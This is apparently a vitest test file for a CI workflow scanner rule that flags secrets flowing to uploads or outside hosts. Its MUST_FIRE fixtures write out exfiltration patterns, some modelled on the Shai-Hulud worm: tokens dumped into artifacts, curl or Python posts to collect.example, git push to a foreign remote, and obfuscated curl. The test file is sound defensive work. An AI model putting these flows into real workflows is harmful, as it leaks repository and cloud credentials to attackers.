/**
 * Cases from the fifth review of WORKFLOW_SECRET_TO_UPLOAD_PATH: flows the
 * model must follow (credential actions, publishers, output positions, paths
 * under a variable or a working directory, env persistence, more clients) and
 * release-workflow shapes it must leave alone (signing, presence checks, home
 * files, dotless names, env and set used as words). Hosts are reserved
 * `.example` names.
 */

import { describe, it, expect, beforeEach, afterEach } from "vitest";
import * as fs from "node:fs";
import * as path from "node:path";
import * as os from "node:os";
import { modelWorkflows } from "../workflow-modeler.js";

let dir: string;
beforeEach(() => {
  dir = fs.mkdtempSync(path.join(os.tmpdir(), "scg-wf-review-"));
});
afterEach(() => {
  fs.rmSync(dir, { recursive: true, force: true });
});

function hits(files: Record<string, string[]>): number[] {
  for (const [rel, lines] of Object.entries(files)) {
    const full = path.join(dir, rel);
    fs.mkdirSync(path.dirname(full), { recursive: true });
    fs.writeFileSync(full, lines.join("\n"));
  }
  return modelWorkflows(dir)
    .filter((f) => f.rule === "WORKFLOW_SECRET_TO_UPLOAD_PATH")
    .map((f) => f.line ?? -1);
}

const MUST_FIRE: Array<[string, Record<string, string[]>, number[]]> = [
  ["fn01-shaihulud2-upload", {".github/workflows/ci.yml":["name: CI","on: push","jobs:","  build:","    runs-on: ubuntu-latest","    steps:","      - run: echo '${{ toJSON(secrets) }}' > format-results.txt","      - uses: actions/upload-artifact@v4","        with:","          name: formatting","          path: format-results.txt"]}, [8]],
  ["fn02-shaihulud1-curl", {".github/workflows/ci.yml":["name: CI","on: push","jobs:","  build:","    runs-on: ubuntu-latest","    steps:","      - run: |","          CONTENTS=\"$(cat findings.json | base64 -w 0)\"","          curl -s -X POST -d \"$CONTENTS\" https://webhook.example/x","        env:","          S: ${{ toJSON(secrets) }}"]}, [7]],
  ["fn04-vault-export-then-curl", {".github/workflows/ci.yml":["name: CI","on: push","jobs:","  build:","    runs-on: ubuntu-latest","    steps:","      - uses: hashicorp/vault-action@v3","        with:","          url: https://vault.example","          token: ${{ secrets.VAULT_TOKEN }}","          secrets: secret/data/ci npm | NPM_TOKEN","      - run: curl -d \"$NPM_TOKEN\" https://collect.example/x"]}, [12]],
  ["fn05-aws-creds-then-curl", {".github/workflows/ci.yml":["name: CI","on: push","jobs:","  build:","    runs-on: ubuntu-latest","    steps:","      - uses: aws-actions/configure-aws-credentials@v4","        with:","          aws-access-key-id: ${{ secrets.AWS_KEY_ID }}","          aws-secret-access-key: ${{ secrets.AWS_SECRET }}","          aws-region: eu-west-1","      - run: env | curl -T - https://collect.example/x"]}, [12]],
  ["fn11-git-push-remote", {".github/workflows/ci.yml":["name: CI","on: push","jobs:","  build:","    runs-on: ubuntu-latest","    steps:","      - env:","          T: ${{ secrets.NPM_TOKEN }}","        run: |","          echo \"$T\" > k.txt && git add k.txt && git commit -m x","          git push https://collect.example/r.git HEAD"]}, [7]],
  ["fn14-requests-session", {".github/workflows/ci.yml":["name: CI","on: push","jobs:","  build:","    runs-on: ubuntu-latest","    steps:","      - env:","          T: ${{ secrets.NPM_TOKEN }}","        run: |","          python3 - <<'EOF'","          import os, requests","          s = requests.Session()","          s.post('https://collect.example/x', data=os.environ['T'])","          EOF"]}, [7]],
  ["fn15-http-client", {".github/workflows/ci.yml":["name: CI","on: push","jobs:","  build:","    runs-on: ubuntu-latest","    steps:","      - env:","          T: ${{ secrets.NPM_TOKEN }}","        run: python3 -c \"import os,http.client as h; c=h.HTTPSConnection('collect.example'); c.request('POST','/', os.environ['T'])\""]}, [7]],
  ["fn16-github-script-request", {".github/workflows/ci.yml":["name: CI","on: push","jobs:","  build:","    runs-on: ubuntu-latest","    steps:","      - uses: actions/github-script@v7","        with:","          github-token: ${{ secrets.ORG_PAT }}","          script: |","            await github.request('POST https://collect.example/x', { data: 'x' })"]}, [7]],
  ["fn18-python-fstring-open", {".github/workflows/ci.yml":["name: CI","on: push","jobs:","  build:","    runs-on: ubuntu-latest","    steps:","      - env:","          T: ${{ secrets.NPM_TOKEN }}","        run: python3 -c \"import os; d='out'; open(f'{d}/k.txt','w').write(os.environ['T'])\"","      - run: curl -T out/k.txt https://collect.example/u"]}, [10]],
  ["fn19-python-join-open", {".github/workflows/ci.yml":["name: CI","on: push","jobs:","  build:","    runs-on: ubuntu-latest","    steps:","      - env:","          T: ${{ secrets.NPM_TOKEN }}","        run: python3 -c \"import os; open(os.path.join('out','k'),'w').write(os.environ['T'])\"","      - run: curl -T out/k https://collect.example/u"]}, [10]],
  ["fn20-workspace-var-dir-upload", {".github/workflows/ci.yml":["name: CI","on: push","jobs:","  build:","    runs-on: ubuntu-latest","    steps:","      - env:","          T: ${{ secrets.NPM_TOKEN }}","        run: mkdir -p dist && echo \"$T\" > \"$GITHUB_WORKSPACE/dist/cfg.txt\"","      - uses: actions/upload-artifact@v4","        with:","          path: dist"]}, [10]],
  ["fn21-expr-workspace-upload", {".github/workflows/ci.yml":["name: CI","on: push","jobs:","  build:","    runs-on: ubuntu-latest","    steps:","      - env:","          T: ${{ secrets.NPM_TOKEN }}","        run: echo \"$T\" > ${{ github.workspace }}/dist/cfg.txt","      - uses: actions/upload-artifact@v4","        with:","          path: dist/"]}, [10]],
  ["fn22-blockscalar-jobenv-upload", {".github/workflows/ci.yml":["name: CI","on: push","jobs:","  build:","    runs-on: ubuntu-latest","    env:","      T: >-","        ${{ secrets.NPM_TOKEN }}","    steps:","      - run: echo \"$T\" > k.txt","      - uses: actions/upload-artifact@v4","        with:","          path: k.txt"]}, [11]],
  ["fn23-format-jobenv-upload", {".github/workflows/ci.yml":["name: CI","on: push","jobs:","  build:","    runs-on: ubuntu-latest","    env:","      T: ${{ format('{0}', secrets.NPM_TOKEN) }}","    steps:","      - run: echo \"$T\" > k.txt","      - uses: actions/upload-artifact@v4","        with:","          path: k.txt"]}, [10]],
  ["fn24-noext-cp-upload", {".github/workflows/ci.yml":["name: CI","on: push","jobs:","  build:","    runs-on: ubuntu-latest","    steps:","      - env:","          T: ${{ secrets.NPM_TOKEN }}","        run: echo \"$T\" > k.txt","      - run: mkdir bundle && cp k.txt bundle","      - uses: actions/upload-artifact@v4","        with:","          path: bundle"]}, [11]],
  ["fn25-openssl-noext", {".github/workflows/ci.yml":["name: CI","on: push","jobs:","  build:","    runs-on: ubuntu-latest","    steps:","      - env:","          T: ${{ secrets.NPM_TOKEN }}","        run: printf %s \"$T\" | openssl enc -aes-256-cbc -pass pass:x -out blob","      - run: curl -T blob https://collect.example/u"]}, [10]],
  ["fn26-vite-inline-pages", {".github/workflows/ci.yml":["name: CI","on: push","jobs:","  build:","    runs-on: ubuntu-latest","    env:","      VITE_API_KEY: ${{ secrets.PRIVATE_API_KEY }}","    steps:","      - run: npm ci && npm run build","      - uses: actions/upload-pages-artifact@v3","        with:","          path: dist","      - uses: actions/upload-artifact@v4","        with:","          path: dist"]}, [10,13]],
  ["fn27-other-publishers", {".github/workflows/ci.yml":["name: CI","on: push","jobs:","  build:","    runs-on: ubuntu-latest","    steps:","      - env:","          T: ${{ secrets.NPM_TOKEN }}","        run: echo \"$T\" > dist/k.txt","      - uses: softprops/action-gh-release@v2","        with:","          files: dist/*","      - uses: peaceiris/actions-gh-pages@v4","        with:","          github_token: ${{ secrets.GITHUB_TOKEN }}","          publish_dir: ./dist","      - uses: actions/upload-artifact/merge@v4","        with:","          pattern: '*'"]}, [10,13]],
  ["fn28-set-output-legacy", {".github/workflows/ci.yml":["name: CI","on: push","jobs:","  build:","    runs-on: ubuntu-latest","    steps:","      - id: a","        env:","          T: ${{ secrets.NPM_TOKEN }}","        run: echo \"::set-output name=t::$T\"","      - run: curl -d \"${{ steps.a.outputs.t }}\" https://collect.example/x"]}, [11]],
  ["fn29-env-file-indirect", {".github/workflows/ci.yml":["name: CI","on: push","jobs:","  build:","    runs-on: ubuntu-latest","    steps:","      - env:","          T: ${{ secrets.NPM_TOKEN }}","        run: F=$GITHUB_ENV; echo \"U=$T\" >> \"$F\"","      - run: curl -d \"$U\" https://collect.example/x"]}, [10]],
  ["fn31-obfuscated-curl", {".github/workflows/ci.yml":["name: CI","on: push","jobs:","  build:","    runs-on: ubuntu-latest","    steps:","      - env:","          T: ${{ secrets.NPM_TOKEN }}","        run: c''url -d \"$T\" https://collect.example/x"]}, [7]],
  ["fn33-local-action-writes-file", {".github/workflows/ci.yml":["name: CI","on: push","jobs:","  build:","    runs-on: ubuntu-latest","    steps:","      - uses: ./.github/actions/w","        with:","          t: ${{ secrets.NPM_TOKEN }}","      - uses: actions/upload-artifact@v4","        with:","          path: out.txt"],".github/actions/w/action.yml":["name: w","inputs:","  t: {}","runs:","  using: composite","  steps:","    - shell: bash","      run: echo \"${{ inputs.t }}\" > out.txt"]}, [10]],
  ["fn35-upload-dotdot", {".github/workflows/ci.yml":["name: CI","on: push","jobs:","  build:","    runs-on: ubuntu-latest","    steps:","      - env:","          T: ${{ secrets.NPM_TOKEN }}","        working-directory: sub","        run: echo \"$T\" > ../out/k.txt","      - uses: actions/upload-artifact@v4","        with:","          path: out"]}, [11]],
  ["fn36-cache-save", {".github/workflows/ci.yml":["name: CI","on: push","jobs:","  build:","    runs-on: ubuntu-latest","    steps:","      - env:","          T: ${{ secrets.NPM_TOKEN }}","        run: echo \"$T\" > .cache/k.txt","      - uses: actions/cache/save@v4","        with:","          path: .cache","          key: k-${{ github.sha }}"]}, [10]],
  ["fn37-read-then-assign", {".github/workflows/ci.yml":["name: CI","on: push","jobs:","  build:","    runs-on: ubuntu-latest","    steps:","      - env:","          T: ${{ secrets.NPM_TOKEN }}","        run: |","          read -r U <<< \"$T\"","          echo \"U=$U\" >> $GITHUB_ENV","      - run: curl -d \"$U\" https://collect.example/x"]}, [12]],
];

const MUST_STAY_QUIET: Array<[string, Record<string, string[]>, number[]]> = [
  ["fp01-android-sign-upload", {".github/workflows/ci.yml":["name: CI","on: push","jobs:","  build:","    runs-on: ubuntu-latest","    steps:","      - run: echo \"${{ secrets.KEYSTORE_B64 }}\" | base64 -d > release.jks","      - run: ./gradlew assembleRelease","      - env:","          KS_PASS: ${{ secrets.KS_PASS }}","        run: jarsigner -keystore release.jks -storepass \"$KS_PASS\" app/build/outputs/apk/release/app.apk key0","      - uses: actions/upload-artifact@v4","        with:","          path: app/build/outputs/apk/release/"]}, []],
  ["fp02-vsce-publish-upload", {".github/workflows/ci.yml":["name: CI","on: push","jobs:","  build:","    runs-on: ubuntu-latest","    steps:","      - run: npx vsce package -o dist/ext.vsix","      - env:","          VSCE_PAT: ${{ secrets.VSCE_PAT }}","        run: npx vsce publish -p \"$VSCE_PAT\" --packagePath dist/ext.vsix","      - uses: actions/upload-artifact@v4","        with:","          path: dist/"]}, []],
  ["fp03-gpg-sign-upload", {".github/workflows/ci.yml":["name: CI","on: push","jobs:","  build:","    runs-on: ubuntu-latest","    steps:","      - env:","          GPG_PASS: ${{ secrets.GPG_PASSPHRASE }}","        run: gpg --batch --pinentry-mode loopback --passphrase \"$GPG_PASS\" --detach-sign dist/pkg.tar.gz","      - uses: actions/upload-artifact@v4","        with:","          path: dist"]}, []],
  ["fp04-curl-deploy-then-artifact", {".github/workflows/ci.yml":["name: CI","on: push","jobs:","  build:","    runs-on: ubuntu-latest","    steps:","      - env:","          T: ${{ secrets.STORE_TOKEN }}","        run: curl -H \"Authorization: Bearer $T\" -T build/app.zip https://store.example/upload","      - uses: actions/upload-artifact@v4","        with:","          path: build"]}, [7]],
  ["fp05-presence-check-output", {".github/workflows/ci.yml":["name: CI","on: push","jobs:","  build:","    runs-on: ubuntu-latest","    steps:","      - id: chk","        run: echo \"has=${{ secrets.CODECOV_TOKEN != '' }}\" >> $GITHUB_OUTPUT","      - run: npm test > reports/junit.xml","      - uses: actions/upload-artifact@v4","        with:","          path: reports","      - run: curl -fsS https://status.example/ping"]}, []],
  ["fp06-presence-check-jobenv", {".github/workflows/ci.yml":["name: CI","on: push","jobs:","  build:","    runs-on: ubuntu-latest","    env:","      HAS_TOKEN: ${{ secrets.SLACK != '' }}","    steps:","      - run: curl -fsSL https://get.tool.example/install.sh -o i.sh && sh i.sh"]}, []],
  ["fp07-basename-config", {".github/workflows/ci.yml":["name: CI","on: push","jobs:","  build:","    runs-on: ubuntu-latest","    steps:","      - run: mkdir -p ~/.kube && echo \"${{ secrets.KUBECONFIG_B64 }}\" | base64 -d > ~/.kube/config","      - run: git config --global user.name bot && curl -fsS -X POST https://status.example/deployed"]}, []],
  ["fp08-basename-token", {".github/workflows/ci.yml":["name: CI","on: push","jobs:","  build:","    runs-on: ubuntu-latest","    steps:","      - run: echo \"${{ secrets.NPM_TOKEN }}\" > \"$RUNNER_TEMP/token\"","      - run: curl -H \"Authorization: token ${{ github.token }}\" https://api.github.example/repos/o/r/releases"]}, []],
  ["fp09-home-npmrc-upload-dot", {".github/workflows/ci.yml":["name: CI","on: push","jobs:","  build:","    runs-on: ubuntu-latest","    steps:","      - run: echo \"//registry.npmjs.org/:_authToken=${{ secrets.NPM_TOKEN }}\" > ~/.npmrc","      - uses: actions/upload-artifact@v4","        with:","          path: ."]}, []],
  ["fp09b-home-var-npmrc-upload-dot", {".github/workflows/ci.yml":["name: CI","on: push","jobs:","  build:","    runs-on: ubuntu-latest","    steps:","      - run: echo \"//registry.npmjs.org/:_authToken=${{ secrets.NPM_TOKEN }}\" > \"$HOME/.npmrc\"","      - uses: actions/upload-artifact@v4","        with:","          path: ."]}, []],
  ["fp10-unnamed-then-upload", {".github/workflows/ci.yml":["name: CI","on: push","jobs:","  build:","    runs-on: ubuntu-latest","    steps:","      - run: echo \"//r/:_authToken=${{ secrets.NPM_TOKEN }}\" > \"$NPM_CONFIG_USERCONFIG\"","      - run: npm test","      - uses: actions/upload-artifact@v4","        with:","          path: coverage/","      - run: curl -X POST -d @payload.json https://hooks.example/x"]}, [9,12]],
  ["fp11-local-action-any-taint", {".github/workflows/ci.yml":["name: CI","on: push","jobs:","  build:","    runs-on: ubuntu-latest","    steps:","      - run: echo \"//r/:_authToken=${{ secrets.NPM_TOKEN }}\" > ~/.npmrc","      - run: npm publish","      - uses: ./.github/actions/notify","        with:","          msg: released"],".github/actions/notify/action.yml":["name: n","runs:","  using: composite","  steps:","    - shell: bash","      run: curl -fsS -X POST https://hooks.example/x -d '{}'"]}, []],
  ["fp12-venv-env-dir", {".github/workflows/ci.yml":["name: CI","on: push","jobs:","  build:","    runs-on: ubuntu-latest","    env:","      TWINE_PASSWORD: ${{ secrets.PYPI_TOKEN }}","    steps:","      - run: |","          python -m venv env","          source env/bin/activate","          python -m build > env/build.log","      - uses: actions/upload-artifact@v4","        with:","          path: env/build.log"]}, []],
  ["fp13-set-subcommand", {".github/workflows/ci.yml":["name: CI","on: push","jobs:","  build:","    runs-on: ubuntu-latest","    env:","      KUBE_TOKEN: ${{ secrets.KUBE_TOKEN }}","    steps:","      - run: kubectl set image deploy/web web=img:1 > rollout/out.txt","      - uses: actions/upload-artifact@v4","        with:","          path: rollout"]}, []],
  ["fp13b-echo-prose-set", {".github/workflows/ci.yml":["name: CI","on: push","jobs:","  build:","    runs-on: ubuntu-latest","    env:","      NPM_TOKEN: ${{ secrets.NPM_TOKEN }}","    steps:","      - run: echo \"version set to 1.2.3\" > notes/release.txt","      - uses: actions/upload-artifact@v4","        with:","          path: notes"]}, []],
  ["fp13c-env-command", {".github/workflows/ci.yml":["name: CI","on: push","jobs:","  build:","    runs-on: ubuntu-latest","    env:","      NPM_TOKEN: ${{ secrets.NPM_TOKEN }}","    steps:","      - run: env NODE_ENV=production npm run build > dist/build-info.txt","      - uses: actions/upload-artifact@v4","        with:","          path: dist"]}, []],
  ["fp14-docker-login-inputs", {".github/workflows/ci.yml":["name: CI","on: push","jobs:","  build:","    runs-on: ubuntu-latest","    steps:","      - env:","          T: ${{ secrets.REG }}","        run: echo \"$T\" | docker login ghcr.io -u bot --password-stdin && docker build -f docker/Dockerfile -t ghcr.io/o/i:1 .","      - uses: actions/upload-artifact@v4","        with:","          path: docker/"]}, []],
  ["fp15-endswith-collision", {".github/workflows/ci.yml":["name: CI","on: push","jobs:","  build:","    runs-on: ubuntu-latest","    steps:","      - run: echo \"${{ secrets.NPM_TOKEN }}\" > summary.md","      - run: npm test","      - uses: actions/upload-artifact@v4","        with:","          path: reports/summary.md"]}, []],
  ["fp16-if-secret-on-curl", {".github/workflows/ci.yml":["name: CI","on: push","jobs:","  build:","    runs-on: ubuntu-latest","    steps:","      - if: ${{ secrets.CODECOV_TOKEN == '' }}","        run: curl -Os https://cli.codecov.example/codecov && chmod +x codecov"]}, []],
  ["fp17-carried-then-log", {".github/workflows/ci.yml":["name: CI","on: push","jobs:","  build:","    runs-on: ubuntu-latest","    steps:","      - run: echo \"NODE_AUTH_TOKEN=${{ secrets.NPM_TOKEN }}\" >> $GITHUB_ENV","      - run: npm test > test-results/out.txt","      - uses: actions/upload-artifact@v4","        with:","          path: test-results"]}, []],
];

describe("WORKFLOW_SECRET_TO_UPLOAD_PATH: fifth review, flows that must be followed", () => {
  it.each(MUST_FIRE)("%s", (_name, files, lines) => {
    expect(hits(files)).toEqual(lines);
  });
});

describe("WORKFLOW_SECRET_TO_UPLOAD_PATH: fifth review, shapes left alone", () => {
  // Two entries report on purpose: the curl step that itself sends the token,
  // and a later reader of a file whose name the writing step does not state.
  it.each(MUST_STAY_QUIET)("%s", (_name, files, lines) => {
    expect(hits(files)).toEqual(lines);
  });
});
